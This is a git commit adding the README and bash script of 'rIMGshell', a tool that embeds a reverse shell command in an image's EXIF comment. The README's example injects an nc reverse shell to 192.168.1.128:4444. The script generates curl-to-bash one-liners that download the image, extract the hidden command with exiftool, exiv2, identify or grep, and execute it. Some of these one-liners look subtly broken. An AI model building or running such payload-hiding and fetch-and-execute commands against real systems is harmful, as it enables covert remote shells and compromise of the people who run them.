b5b2fcf26c9222c75d121a51d74784f4f54e26c6
git5 <137344845+git5loxosec@users.noreply.github.com>
2023-09-22 21:29:49 -0400

    Add files via upload
    ```markdown
    # rIMGshell
    
    ![GitHub](https://img.shields.io/github/license/git5loxosec/rIMGshell)
    
    rIMGshell is a command-line tool for injecting a reverse shell command into an image and generating one-liner execution methods to exploit it.
    
    ## Features
    
    - Inject reverse shell commands into image files.
    - Generate one-liner execution methods for various tools.
    - Choose from multiple one-liner execution methods.
    
    ## Installation
    
    1. Clone the repository:
    
       ```
       git clone https://github.com/git5loxosec/rIMGshell.git
       ```
    
    2. Change to the project directory:
    
       ```
       cd rIMGshell
       ```
    
    3. Make the script executable:
    
       ```
       chmod +x rIMGshell.sh
       ```
    
    ## Usage
    
    ```
    ./rIMGshell.sh [OPTIONS] <REVERSE_SHELL_COMMAND> <IMAGE_FILENAME>
    ```
    
    - `[OPTIONS]` - Optional arguments.
    - `<REVERSE_SHELL_COMMAND>` - The reverse shell command to inject.
    - `<IMAGE_FILENAME>` - The name of the image file.
    
    **Example:**
    
    ```
    ./rIMGshell.sh "nc 192.168.1.128 4444 -e /bin/sh" image.jpg
    ```
    
    ## One-Liner Execution Methods
    
    - **exiftool-one-liner:** Injected image can be executed with exiftool.
    - **exiv2-one-liner:** Injected image can be executed with exiv2.
    - **identify-one-liner:** Injected image can be executed with identify.
    - **file-grep-one-liner:** Injected image can be executed with file and grep.
    - **jpeginfo-grep-one-liner:** Injected image can be executed with jpeginfo and grep.
    
    ## Contributing
    
    Contributions are welcome! Please fork the repository and submit a pull request.
    
    ```

---
+++ rIMGshell.sh
@@ -0,0 +1,92 @@
+#!/bin/bash
+#
+# LoxoSec
+# git5
+#------------------------------------------------
+# Whatsapp group
+# https://chat.whatsapp.com/Iv7lplJVgM16FeuIzKhFxj
+# ------------------------------------------------
+# Website
+# https://www.LoxoSec.rf.gd
+# ------------------------------------------------
+# Github
+# https://github.com/git5loxosec
+# ------------------------------------------------
+
+show_help() {
+    echo "Usage: $0 [OPTIONS] <REVERSE_SHELL_COMMAND> <IMAGE_FILENAME>"
+    echo "Inject a reverse shell command into an image and generate a one-liner execution method."
+    echo ""
+    echo "Options:"
+    echo "  -h, --help           Display this help message."
+    echo ""
+    echo "Arguments:"
+    echo "  <REVERSE_SHELL_COMMAND> The reverse shell command to inject."
+    echo "  <IMAGE_FILENAME>     The name of the image file."
+    echo ""
+}
+
+if [ "$1" == "-h" ] || [ "$1" == "--help" ]; then
+    show_help
+    exit 0
+fi
+
+
+if [ $# -ne 2 ]; then
+    echo "Error: Invalid number of arguments."
+    show_help
+    exit 1
+fi
+
+command="$1"
+image_filename="$2"
+
+exiftool -Comment="$command" "$image_filename"
+
+echo "Command injection completed."
+
+read -p "Enter the URL path to the image file (e.g., http://www.example.com/): " image_url
+
+echo "Choose a one-liner execution method:"
+echo "1. exiftool-one-liner"
+echo "2. exiv2-one-liner"
+echo "3. identify-one-liner"
+echo "4. file-grep-one-liner"
+echo "5. jpeginfo-grep-one-liner"
+read -p "Enter the method number (1-5): " method_choice
+
+case "$method_choice" in
+    1)
+        echo -e "\e[34mGenerating one-liner method with exiftool..."
+        one_liner="curl -sS '$image_url' | exiftool -Comment -b - | bash"
+        echo "Generated one-liner:"
+        echo -e "$one_liner\e[0m"
+        ;;
+    2)
+        echo -e "\e[34mGenerating one-liner method with exiv2..."
+        one_liner="curl -sS '$image_url' | exiv2 -p c | bash"
+        echo "Generated one-liner:"
+        echo -e "$one_liner\e[0m"
+        ;;
+    3)
+        echo -e "\e[34mGenerating one-liner method with identify..."
+        one_liner="curl -sS '$image_url' | identify -format '%c' | bash"
+        echo "Generated one-liner:"
+        echo -e "$one_liner\e[0m"
+        ;;
+    4)
+        echo -e "\e[34mGenerating one-liner method with file and grep..."
+        one_liner="curl -sS '$image_url' | file - | grep -o 'comment: \".*\"' | bash"
+        echo "Generated one-liner:"
+        echo -e "$one_liner\e[0m"
+        ;;
+    5)
+        echo -e "\e[34mGenerating one-liner method with jpeginfo and grep..."
+        one_liner="curl -sS '$image_url' | jpeginfo -ls - | grep -o '/bin/sh [^\"']*' | bash"
+        echo "Generated one-liner:"
+        echo -e "$one_liner\e[0m"
+        ;;
+    *)
+        echo "Invalid method choice."
+        ;;
+esac
